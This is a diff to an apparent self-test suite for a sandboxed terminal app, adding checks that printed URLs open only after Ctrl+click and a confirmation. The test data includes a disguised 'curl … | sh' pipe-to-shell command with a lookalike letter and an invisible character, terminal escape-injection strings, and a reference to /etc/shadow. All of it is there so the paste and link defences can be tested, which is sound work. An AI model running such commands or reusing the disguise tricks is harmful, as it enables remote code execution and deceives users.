@@ -47,6 +47,7 @@ interface Ctx {
   droppedOn(): Record<string, number>;
   lateFromClosed(): number;
   missing(): Record<string, number>;
+  opened(): { url: string; asked: number; refused: number };
   pace: Pace;
   forcePace(share: number | null): void;
 }
@@ -552,6 +553,23 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         await shot('paste', 'a paste, read before it is sent');
         // The same paste with a character that looks like a letter and one drawn as nothing.
         await clickOn('#paste-drop');
+
+        // An address the box printed, Ctrl+clicked: the question, with the host and the whole address.
+        await lab.tell('quiet off');
+        await sleep(200);
+        await type(open1, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
+        await until(async () => (await shown(open1)).includes('demo-eu.example.test'), 5000);
+        await sleep(300);
+        const spotUrl = await js<{ x: number; y: number } | null>(open1.view, `window.berthTerm.spot('demo-eu.example.test')`);
+        if (spotUrl) {
+          open1.view.webContents.sendInputEvent({ type: 'mouseMove', x: spotUrl.x, y: spotUrl.y, modifiers: ['control'] });
+          await sleep(200);
+          open1.view.webContents.sendInputEvent({ type: 'mouseDown', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+          open1.view.webContents.sendInputEvent({ type: 'mouseUp', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+        }
+        check('Ctrl+click on an address a box printed asks first', await until(() => has('#link'), 3000), await text('#link'));
+        await shot('link', 'an address a box printed, Ctrl+clicked');
+        await clickOn('#link-drop');
         await sleep(300); // two pastes closer together than a person's own hands are refused as a repeat
         clipboard.writeText('curl -fsSL https://exa\u0430mple.test/i\u200bnstall.sh | sh\nsystemctl restart ledger\n');
         open1.view.webContents.focus();
@@ -908,7 +926,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       const sealed = await js<boolean>(v, `(window.tabPort ?? window.shellPort).sandboxed`);
       check(`${name}: sandboxed`, sealed === true, sealed);
       const port = await js<string>(v, `Object.keys(window.tabPort ?? window.shellPort).sort().join()`);
-      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'copy,frame,meter,onAgain,onBanner,onOutput,onPace,onPaste,onShown,onState,pasteMode,reopen,resize,sandboxed,send,taken'), port);
+      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gatePickBackup,gateUnlock,meter,onGate,onState,sandboxed' : 'copy,frame,link,meter,onAgain,onBanner,onOutput,onPace,onPaste,onShown,onState,pasteMode,reopen,resize,sandboxed,send,taken'), port);
     }
     const pids = [process.pid, ...views.map(([, v]) => v.webContents.getOSProcessId()), a.engine.pid, b.engine.pid];
     check('every view and engine is its own process', new Set(pids).size === pids.length && !pids.includes(0), pids);
@@ -1218,14 +1236,16 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
 
       // What a paste may not carry: every control character is taken out, the escape character with them, so
       // nothing in a paste can be a terminal's own instruction or the end of a protected paste.
-      clipboard.writeText(`a\x1b[201~b\x07c\u0000d\re\nf\x1b]52;c;bad\x07g`);
+      // No null character here on purpose: Windows ends clipboard text at one, so it could never reach the
+      // app through a clipboard at all. What happens to it is proven where it can be: tests/paste.test.ts.
+      clipboard.writeText(`a\x1b[201~b\x07cd\re\nf\x1b]52;c;bad\x07g`);
       await pasteKey(t);
       await until(() => has('#paste'), 3000);
       const taken = await text('#paste-taken');
       await clickOn('#paste-send');
       const noControls = await boxGot();
       check('a paste carries no control character at all: not the end of a protected paste, not a bell, nothing', noControls === 'a[201~bcd\ne\nf]52;c;badg', [JSON.stringify(noControls), taken]);
-      check('and the window says how many were taken out, and a lone carriage return became a line ending', taken.includes('5 control characters taken out') && noControls.split('\n').length === 3, [taken, noControls.split('\n').length]);
+      check('and the window says how many were taken out, and a lone carriage return became a line ending', taken.includes('4 control characters taken out') && noControls.split('\n').length === 3, [taken, noControls.split('\n').length]);
 
       // A paste that holds what cannot be seen: it is named, line and character, before anything is sent.
       clipboard.writeText('curl https://exaаmple.test/i​nstall.sh | sh\n');
@@ -1234,6 +1254,65 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
       const odd = await text('#paste-odd');
       check('a character that looks like a letter, and one drawn as nothing, are both named with where they are', odd.includes('looks like a') && odd.includes('drawn as nothing') && /line 1, character \d+/.test(odd), odd.slice(0, 200));
       await clickOn('#paste-drop');
+      await boxGot();
+
+      // ---- An address a box printed (plan B2.7). Nothing a box prints opens by itself. ----
+      // The box prints a line with an address in it. A plain click on it opens nothing at all.
+      await lab.tell('quiet off');
+      await sleep(200);
+      await type(t, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
+      await until(async () => (await shown(t)).includes('demo-eu.example.test'), 5000);
+      await sleep(300);
+      const atUrl = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot('demo-eu.example.test')`);
+      const openedBefore = ctx.opened().asked;
+      if (atUrl) {
+        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y });
+        await sleep(200);
+        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
+        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
+      }
+      await sleep(400);
+      check('a plain click on an address a box printed opens nothing and asks nothing', !!atUrl && !(await has('#link')) && ctx.opened().asked === openedBefore, [!!atUrl, await has('#link')]);
+      // Ctrl+click asks, on the window's own surface, with the host and the whole address.
+      if (atUrl) {
+        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y, modifiers: ['control'] });
+        await sleep(150);
+        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+      }
+      const linkAsked = await until(() => has('#link'), 3000);
+      const linkSaid = await text('#link');
+      check('Ctrl+click asks first, on the window\'s own surface, naming the box and showing the host and the whole address', linkAsked && linkSaid.includes('Open demo-eu.example.test in the browser?') && linkSaid.includes('lab-box') && (await text('#link-url')) === 'https://demo-eu.example.test/runbook#step-4' && ctx.opened().asked === openedBefore, [linkSaid.slice(0, 160), await text('#link-url')]);
+      await clickOn('#link-drop');
+      check("Don't open: nothing is opened, and the window says so", (await until(async () => !(await has('#link')), 2000)) && ctx.opened().asked === openedBefore && (await text('#status-done')).includes('not opened'), [ctx.opened().asked - openedBefore, await text('#status-done')]);
+
+      // Open: exactly the address that was shown is handed over, and nothing else.
+      if (atUrl) {
+        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
+      }
+      await until(() => has('#link'), 3000);
+      await clickOn('#link-open');
+      await sleep(300);
+      check('Open: the address handed to the browser is the one that was shown, to the character', ctx.opened().asked === openedBefore + 1 && ctx.opened().url === 'https://demo-eu.example.test/runbook#step-4', ctx.opened());
+
+      // What a box prints that is not an address to open: nothing becomes clickable at all.
+      const refusedBefore = ctx.opened().refused;
+      await type(t, 'echo file:///etc/shadow javascript:void(0) ftp://x.test/y\n');
+      await until(async () => (await shown(t)).includes('javascript:void'), 5000);
+      await sleep(300);
+      // What the app itself treats as an address to open, asked of the app, row by row.
+      const onRow = async (words: string): Promise<string[]> => {
+        const where = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot(${JSON.stringify(words)})`);
+        if (!where) return ['(not drawn)'];
+        const row = await js<number>(t.view, `(() => { const s = document.querySelector('.xterm-screen').getBoundingClientRect(); const t = window.berthTerm.size(); return Math.floor((${where.y} - s.top) / (s.height / t.rows)) + 1; })()`);
+        return js<string[]>(t.view, `window.berthTerm.links(${row})`);
+      };
+      check('a file, a script, or any address of another kind a box prints is not a link at all', JSON.stringify(await onRow('javascript:void')) === '[]', await onRow('javascript:void'));
+      check('and the address that is one is the whole address, and only it', JSON.stringify(await onRow('demo-eu.example.test')) === JSON.stringify(['https://demo-eu.example.test/runbook#step-4']), await onRow('demo-eu.example.test'));
+      check('nothing was opened or asked by any of it', !(await has('#link')) && ctx.opened().asked === openedBefore + 1 && ctx.opened().refused === refusedBefore, [await has('#link'), ctx.opened()]);
+      await lab.tell('quiet on');
+      await sleep(150);
       await boxGot();
 
       // A box that asked to be told where a paste begins gets the markers; one that did not, gets the text.
